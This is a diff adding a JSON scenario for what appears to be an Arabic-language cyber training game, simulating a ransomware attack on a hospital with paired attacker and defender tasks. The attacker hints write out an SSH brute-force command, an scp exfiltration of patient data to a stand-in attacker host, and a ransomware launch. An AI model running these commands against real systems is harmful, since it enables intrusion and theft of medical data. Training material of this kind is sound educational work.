@@ -1,0 +1,733 @@
+{
+    "id": "ransomware-op-1",
+    "title": "عملية: التشفير الشامل",
+    "titleEn": "Operation Blackout",
+    "description": "محاكاة هجوم فدية متكامل على بنية مستشفى. تعلم سلسلة الاستغلال من الاستطلاع حتى التشفير.",
+    "difficulty": "intermediate",
+    "domain": "networking",
+    "estimatedTime": 45,
+    "xpReward": 1500,
+    "roles": {
+        "attacker": {
+            "title": "المهاجم: The Architect",
+            "theme": "red",
+            "description": "تقمص دور المهاجم (Red Team) ونفذ هجوم Kill Chain كامل."
+        },
+        "defender": {
+            "title": "المدافع: The Hunter",
+            "theme": "blue",
+            "description": "بصفتك (Blue Team)، اكتشف التسلل وأوقف الهجوم قبل الكارثة."
+        }
+    },
+    "phases": [
+        {
+            "id": "recon",
+            "order": 1,
+            "title": "الاستطلاع",
+            "titleEn": "Reconnaissance",
+            "concept": "اكتشاف الخدمات والمنافذ المفتوحة",
+            "duration": 8,
+            "story": {
+                "attacker": [
+                    {
+                        "speaker": "النظام",
+                        "text": "تم تحديد الهدف: 192.168.1.50 (خادم السجلات الطبية).",
+                        "type": "system"
+                    },
+                    {
+                        "speaker": "الوسيط",
+                        "text": "المستشفى يعتمد على أنظمة قديمة. نحتاج لمعرفة المنافذ المفتوحة أولاً.",
+                        "type": "handler"
+                    }
+                ],
+                "defender": [
+                    {
+                        "speaker": "SIEM",
+                        "text": "تنبيه: رصد محاولات فحص منافذ غير عادية من IP خارجي.",
+                        "type": "alert"
+                    },
+                    {
+                        "speaker": "المدير",
+                        "text": "راقب السجلات واكتشف مصدر هذه المحاولات.",
+                        "type": "manager"
+                    }
+                ]
+            },
+            "tools": {
+                "attacker": [
+                    {
+                        "id": "nmap",
+                        "name": "Nmap",
+                        "icon": "radar",
+                        "description": "فحص الشبكة والمنافذ"
+                    },
+                    {
+                        "id": "masscan",
+                        "name": "Masscan",
+                        "icon": "zap",
+                        "description": "فحص سريع للمنافذ"
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "tcpdump",
+                        "name": "Tcpdump",
+                        "icon": "activity",
+                        "description": "التقاط حركة الشبكة"
+                    },
+                    {
+                        "id": "fail2ban",
+                        "name": "Fail2Ban",
+                        "icon": "shield",
+                        "description": "حظر IP المهاجم"
+                    }
+                ]
+            },
+            "tasks": {
+                "attacker": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "اكتشف المنافذ المفتوحة على الهدف",
+                        "validation": {
+                            "command": "nmap",
+                            "outputContains": "22/tcp"
+                        },
+                        "points": 100,
+                        "hints": [
+                            {
+                                "cost": 25,
+                                "text": "استخدم nmap مع الخيار -p لتحديد المنافذ"
+                            }
+                        ]
+                    },
+                    {
+                        "id": "task-2",
+                        "type": "bonus",
+                        "description": "اكتشف نظام التشغيل",
+                        "validation": {
+                            "command": "nmap",
+                            "argsContain": "-O"
+                        },
+                        "points": 150,
+                        "hidden": true
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "التقط حركة الشبكة المشبوهة",
+                        "validation": {
+                            "command": "tcpdump",
+                            "outputContains": "SYN"
+                        },
+                        "points": 100,
+                        "hints": [
+                            {
+                                "cost": 25,
+                                "text": "استخدم tcpdump -i eth0 لمراقبة الواجهة"
+                            }
+                        ]
+                    }
+                ]
+            },
+            "questions": {
+                "attacker": [
+                    {
+                        "id": "q1",
+                        "type": "gate",
+                        "question": "ما هي الأداة القياسية لفحص المنافذ؟",
+                        "options": [
+                            {
+                                "id": 1,
+                                "text": "Nmap",
+                                "correct": true
+                            },
+                            {
+                                "id": 2,
+                                "text": "Photoshop",
+                                "correct": false
+                            },
+                            {
+                                "id": 3,
+                                "text": "Word",
+                                "correct": false
+                            }
+                        ],
+                        "points": 50,
+                        "explanation": "Nmap هي الأداة الأشهر لاكتشاف الخدمات والمنافذ في الشبكات."
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "q1",
+                        "type": "gate",
+                        "question": "ما الأداة التي تلتقط حركة الشبكة في لينكس؟",
+                        "options": [
+                            {
+                                "id": 1,
+                                "text": "Tcpdump",
+                                "correct": true
+                            },
+                            {
+                                "id": 2,
+                                "text": "Notepad",
+                                "correct": false
+                            },
+                            {
+                                "id": 3,
+                                "text": "Chrome",
+                                "correct": false
+                            }
+                        ],
+                        "points": 50,
+                        "explanation": "Tcpdump أداة سطر أوامر لالتقاط وتحليل حركة الشبكة."
+                    }
+                ]
+            },
+            "terminalConfig": {
+                "attacker": {
+                    "prompt": "root@kali:~/ops#",
+                    "successOutput": "PORT 22/tcp OPEN (OpenSSH 7.2)",
+                    "hint": "nmap -p 22 192.168.1.50"
+                },
+                "defender": {
+                    "prompt": "admin@soc:~/logs#",
+                    "successOutput": "SYN packets detected from 10.0.0.5",
+                    "hint": "tcpdump -i eth0 port 22"
+                }
+            },
+            "mentorNotes": {
+                "attacker": "وجدنا منفذ SSH مفتوحاً! هذا هو مدخلنا المحتمل للنظام.",
+                "defender": "رصدنا محاولات فحص. الخطوة التالية هي تتبع المصدر وحظره."
+            }
+        },
+        {
+            "id": "initial-access",
+            "order": 2,
+            "title": "الوصول الأولي",
+            "titleEn": "Initial Access",
+            "concept": "كسر كلمات المرور والدخول للنظام",
+            "duration": 10,
+            "story": {
+                "attacker": [
+                    {
+                        "speaker": "الوسيط",
+                        "text": "ممتاز، المنفذ 22 مفتوح. لكننا لا نملك المفتاح.",
+                        "type": "handler"
+                    },
+                    {
+                        "speaker": "الوسيط",
+                        "text": "كلمات المرور في هذه المستشفيات عادة ما تكون ضعيفة. جرب كسرها.",
+                        "type": "handler"
+                    }
+                ],
+                "defender": [
+                    {
+                        "speaker": "SIEM",
+                        "text": "تنبيه حرج: محاولات تسجيل دخول فاشلة متكررة على SSH!",
+                        "type": "critical"
+                    },
+                    {
+                        "speaker": "المحلل",
+                        "text": "هذا يبدو مثل هجوم Brute Force. يجب أن نتصرف سريعاً.",
+                        "type": "analyst"
+                    }
+                ]
+            },
+            "tools": {
+                "attacker": [
+                    {
+                        "id": "hydra",
+                        "name": "Hydra",
+                        "icon": "key",
+                        "description": "كسر كلمات المرور"
+                    },
+                    {
+                        "id": "medusa",
+                        "name": "Medusa",
+                        "icon": "unlock",
+                        "description": "هجوم تخمين سريع"
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "lastlog",
+                        "name": "Lastlog",
+                        "icon": "file-text",
+                        "description": "سجل آخر تسجيلات الدخول"
+                    },
+                    {
+                        "id": "fail2ban",
+                        "name": "Fail2Ban",
+                        "icon": "ban",
+                        "description": "حظر المهاجمين تلقائياً"
+                    }
+                ]
+            },
+            "tasks": {
+                "attacker": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "اكسر كلمة مرور المستخدم admin",
+                        "validation": {
+                            "command": "hydra",
+                            "outputContains": "password:"
+                        },
+                        "points": 150,
+                        "hints": [
+                            {
+                                "cost": 30,
+                                "text": "استخدم hydra -l admin -P wordlist.txt ssh://IP"
+                            }
+                        ]
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "اعرض محاولات الدخول الفاشلة",
+                        "validation": {
+                            "command": "cat",
+                            "argsContain": "auth.log"
+                        },
+                        "points": 100
+                    },
+                    {
+                        "id": "task-2",
+                        "type": "required",
+                        "description": "احظر IP المهاجم",
+                        "validation": {
+                            "command": "fail2ban-client",
+                            "argsContain": "ban"
+                        },
+                        "points": 150
+                    }
+                ]
+            },
+            "questions": {
+                "attacker": [
+                    {
+                        "id": "q1",
+                        "type": "gate",
+                        "question": "أي أداة تستخدم لهجوم Brute Force على SSH؟",
+                        "options": [
+                            {
+                                "id": 1,
+                                "text": "Hydra",
+                                "correct": true
+                            },
+                            {
+                                "id": 2,
+                                "text": "Wireshark",
+                                "correct": false
+                            },
+                            {
+                                "id": 3,
+                                "text": "Ping",
+                                "correct": false
+                            }
+                        ],
+                        "points": 50
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "q1",
+                        "type": "gate",
+                        "question": "أين تُسجل محاولات الدخول الفاشلة في لينكس؟",
+                        "options": [
+                            {
+                                "id": 1,
+                                "text": "/var/log/auth.log",
+                                "correct": true
+                            },
+                            {
+                                "id": 2,
+                                "text": "/etc/passwd",
+                                "correct": false
+                            },
+                            {
+                                "id": 3,
+                                "text": "/home/user",
+                                "correct": false
+                            }
+                        ],
+                        "points": 50
+                    }
+                ]
+            },
+            "terminalConfig": {
+                "attacker": {
+                    "prompt": "root@kali:~/ops#",
+                    "successOutput": "LOGIN FOUND: [admin] / [hospital123]",
+                    "hint": "hydra -l admin -P passlist.txt ssh://192.168.1.50"
+                },
+                "defender": {
+                    "prompt": "admin@soc:~/logs#",
+                    "successOutput": "IP 10.0.0.5 has been banned",
+                    "hint": "fail2ban-client set sshd banip 10.0.0.5"
+                }
+            },
+            "mentorNotes": {
+                "attacker": "نجحنا! كلمة المرور hospital123. كلمات المرور الضعيفة هي أكبر ثغرة.",
+                "defender": "تم حظر المهاجم. لكن الأمان الحقيقي يتطلب MFA وليس كلمات مرور فقط."
+            }
+        },
+        {
+            "id": "execution",
+            "order": 3,
+            "title": "التنفيذ والتثبيت",
+            "titleEn": "Execution",
+            "concept": "الدخول للنظام واستكشافه",
+            "duration": 8,
+            "story": {
+                "attacker": [
+                    {
+                        "speaker": "الوسيط",
+                        "text": "لدينا البيانات. الطريق ممهد الآن.",
+                        "type": "handler"
+                    },
+                    {
+                        "speaker": "المهمة",
+                        "text": "ادخل للنظام وأثبت وجودنا.",
+                        "type": "objective"
+                    }
+                ],
+                "defender": [
+                    {
+                        "speaker": "SIEM",
+                        "text": "تنبيه: تسجيل دخول ناجح غير معتاد في وقت غير معتاد!",
+                        "type": "alert"
+                    },
+                    {
+                        "speaker": "المدير",
+                        "text": "تحقق من هذا الدخول فوراً. قد يكون اختراق.",
+                        "type": "manager"
+                    }
+                ]
+            },
+            "tools": {
+                "attacker": [
+                    {
+                        "id": "ssh",
+                        "name": "SSH",
+                        "icon": "terminal",
+                        "description": "الاتصال الآمن بالسيرفر"
+                    },
+                    {
+                        "id": "ls",
+                        "name": "ls",
+                        "icon": "folder",
+                        "description": "استعراض الملفات"
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "who",
+                        "name": "who",
+                        "icon": "users",
+                        "description": "من المتصل الآن"
+                    },
+                    {
+                        "id": "ps",
+                        "name": "ps aux",
+                        "icon": "cpu",
+                        "description": "العمليات الجارية"
+                    }
+                ]
+            },
+            "tasks": {
+                "attacker": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "ادخل للسيرفر عبر SSH",
+                        "validation": {
+                            "command": "ssh",
+                            "argsContain": "admin@"
+                        },
+                        "points": 100
+                    },
+                    {
+                        "id": "task-2",
+                        "type": "required",
+                        "description": "استعرض الملفات الحساسة",
+                        "validation": {
+                            "command": "ls",
+                            "argsContain": "-la"
+                        },
+                        "points": 100
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "اكتشف المستخدمين المتصلين",
+                        "validation": {
+                            "command": "who",
+                            "outputContains": "admin"
+                        },
+                        "points": 100
+                    },
+                    {
+                        "id": "task-2",
+                        "type": "required",
+                        "description": "راقب العمليات الجارية",
+                        "validation": {
+                            "command": "ps",
+                            "argsContain": "aux"
+                        },
+                        "points": 100
+                    }
+                ]
+            },
+            "terminalConfig": {
+                "attacker": {
+                    "prompt": "admin@hospital-server:~$",
+                    "successOutput": "drwx------ patients_db (Sensitive)",
+                    "hint": "ls -la"
+                },
+                "defender": {
+                    "prompt": "admin@soc:~/logs#",
+                    "successOutput": "admin    pts/0    10.0.0.5",
+                    "hint": "who"
+                }
+            }
+        },
+        {
+            "id": "exfiltration",
+            "order": 4,
+            "title": "سرقة البيانات",
+            "titleEn": "Exfiltration",
+            "concept": "نسخ البيانات الحساسة للخارج",
+            "duration": 10,
+            "story": {
+                "attacker": [
+                    {
+                        "speaker": "الوسيط",
+                        "text": "كنز ثمين! قبل أن نشفر، يجب أن نسرق نسخة.",
+                        "type": "handler"
+                    },
+                    {
+                        "speaker": "الوسيط",
+                        "text": "سنبتزهم مرتين: مرة للتشفير، ومرة لعدم نشر البيانات.",
+                        "type": "handler"
+                    }
+                ],
+                "defender": [
+                    {
+                        "speaker": "Firewall",
+                        "text": "تنبيه: نقل بيانات ضخم للخارج (2.4GB)!",
+                        "type": "critical"
+                    },
+                    {
+                        "speaker": "المحلل",
+                        "text": "هذا تسريب بيانات! يجب قطع الاتصال فوراً.",
+                        "type": "analyst"
+                    }
+                ]
+            },
+            "tools": {
+                "attacker": [
+                    {
+                        "id": "scp",
+                        "name": "SCP",
+                        "icon": "upload",
+                        "description": "نسخ آمن للملفات"
+                    },
+                    {
+                        "id": "tar",
+                        "name": "Tar",
+                        "icon": "archive",
+                        "description": "ضغط الملفات"
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "iptables",
+                        "name": "IPtables",
+                        "icon": "shield",
+                        "description": "جدار الحماية"
+                    },
+                    {
+                        "id": "netstat",
+                        "name": "Netstat",
+                        "icon": "activity",
+                        "description": "الاتصالات النشطة"
+                    }
+                ]
+            },
+            "tasks": {
+                "attacker": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "انسخ مجلد patients_db للخارج",
+                        "validation": {
+                            "command": "scp",
+                            "argsContain": "patients_db"
+                        },
+                        "points": 200
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "اكتشف الاتصال المشبوه",
+                        "validation": {
+                            "command": "netstat",
+                            "outputContains": "ESTABLISHED"
+                        },
+                        "points": 100
+                    },
+                    {
+                        "id": "task-2",
+                        "type": "required",
+                        "description": "احظر الاتصال الخارجي",
+                        "validation": {
+                            "command": "iptables",
+                            "argsContain": "DROP"
+                        },
+                        "points": 200
+                    }
+                ]
+            },
+            "terminalConfig": {
+                "attacker": {
+                    "prompt": "admin@hospital-server:~$",
+                    "successOutput": "Transfer Complete: 100% (2.4GB)",
+                    "hint": "scp -r patients_db attacker@10.66.66.1:/loot"
+                },
+                "defender": {
+                    "prompt": "admin@soc:~#",
+                    "successOutput": "Connection to 10.66.66.1 blocked",
+                    "hint": "iptables -A OUTPUT -d 10.66.66.1 -j DROP"
+                }
+            }
+        },
+        {
+            "id": "impact",
+            "order": 5,
+            "title": "الضربة النهائية",
+            "titleEn": "Impact",
+            "concept": "تشفير الملفات أو إيقاف الهجوم",
+            "duration": 8,
+            "story": {
+                "attacker": [
+                    {
+                        "speaker": "الوسيط",
+                        "text": "البيانات معنا. الآن حان وقت الضربة القاضية.",
+                        "type": "handler"
+                    },
+                    {
+                        "speaker": "المهمة",
+                        "text": "شغل البرمجية، شفر كل شيء، واترك رسالة الفدية.",
+                        "type": "objective"
+                    }
+                ],
+                "defender": [
+                    {
+                        "speaker": "Monitor",
+                        "text": "تنبيه خطير: استهلاك CPU 100% وتشفير ملفات!",
+                        "type": "critical"
+                    },
+                    {
+                        "speaker": "المدير",
+                        "text": "أوقف العملية الخبيثة فوراً!",
+                        "type": "manager"
+                    }
+                ]
+            },
+            "tools": {
+                "attacker": [
+                    {
+                        "id": "python",
+                        "name": "Python",
+                        "icon": "code",
+                        "description": "تشغيل سكربت التشفير"
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "top",
+                        "name": "Top",
+                        "icon": "cpu",
+                        "description": "مراقبة العمليات"
+                    },
+                    {
+                        "id": "kill",
+                        "name": "Kill",
+                        "icon": "x-circle",
+                        "description": "إنهاء العمليات"
+                    }
+                ]
+            },
+            "tasks": {
+                "attacker": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "شغل برمجية الفدية",
+                        "validation": {
+                            "command": "python",
+                            "argsContain": "dark_locker"
+                        },
+                        "points": 300
+                    }
+                ],
+                "defender": [
+                    {
+                        "id": "task-1",
+                        "type": "required",
+                        "description": "اكتشف العملية الخبيثة",
+                        "validation": {
+                            "command": "top",
+                            "outputContains": "dark_locker"
+                        },
+                        "points": 100
+                    },
+                    {
+                        "id": "task-2",
+                        "type": "required",
+                        "description": "اقتل العملية (PID 4455)",
+                        "validation": {
+                            "command": "kill",
+                            "argsContain": "4455"
+                        },
+                        "points": 300
+                    }
+                ]
+            },
+            "terminalConfig": {
+                "attacker": {
+                    "prompt": "admin@hospital-server:~$",
+                    "successOutput": "ENCRYPTION COMPLETE. ALL FILES LOCKED.",
+                    "hint": "python3 dark_locker.py"
+                },
+                "defender": {
+                    "prompt": "admin@hospital-server:~#",
+                    "successOutput": "Process 4455 terminated",
+                    "hint": "kill -9 4455"
+                }
+            }
+        }
+    ],
+    "debrief": {
+        "attacker": {
+            "summary": "لقد نفذت هجوم Kill Chain متكامل: استطلاع → وصول → استكشاف → سرقة → تشفير.",
+            "realWorld": "تكتيك 'الابتزاز المزدوج' هو المعيار الحالي لعصابات الفدية. السرقة تضمن الدفع حتى لو كان لدى الضحية نسخ احتياطية.",
+            "ethicalNote": "تذكر: هذه المهارات للدفاع فقط. استخدامها للأذى جريمة يعاقب عليها القانون."
+        },
+        "defender": {
+            "summary": "لقد نجحت في احتواء حادث سيبراني نشط وتقليل الأضرار.",
+            "realWorld": "في مراكز العمليات (SOC)، السرعة هي العامل الحاسم. كل دقيقة تأخير تعني فقدان آلاف الملفات.",
+            "nextSteps": "الخطوات التالية: عزل الجهاز، التحليل الجنائي، تقرير الحادث."
+        }
+    }
+}
